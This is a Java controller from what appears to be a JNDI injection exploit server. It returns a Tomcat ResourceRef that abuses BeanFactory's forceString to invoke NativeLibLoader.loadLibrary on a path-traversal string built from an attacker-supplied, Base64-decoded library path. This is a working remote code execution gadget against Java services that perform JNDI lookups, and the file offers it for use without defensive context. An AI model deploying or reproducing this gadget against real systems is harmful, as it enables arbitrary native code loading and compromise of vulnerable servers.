package com.example.exploit.controller;

import com.example.exploit.annotation.JNDIController;
import com.example.exploit.annotation.JNDIMapping;
import com.example.exploit.entity.Result;
import org.apache.naming.ResourceRef;

import javax.naming.StringRefAddr;
import java.util.Base64;

@JNDIController
@JNDIMapping("/NativeLibLoader")
public class NativeLibLoaderController {
    public Object process(Result result) {
        ResourceRef ref = new ResourceRef("com.sun.glass.utils.NativeLibLoader", null, "", "",
                true, "org.apache.naming.factory.BeanFactory", null);
        ref.add(new StringRefAddr("forceString", "a=loadLibrary"));
        ref.add(new StringRefAddr("a", "/../../../../../../../../../../../../" + result.getName()));

        System.out.println("NativeLibLoader Bypass");
        return ref;
    }

    @JNDIMapping("/{path}")
    public Result load(String path) {
        path = new String(Base64.getUrlDecoder().decode(path));
        System.out.println("[LDAP] Native Library Path: " + path);
        return new Result(path, null);
    }
}
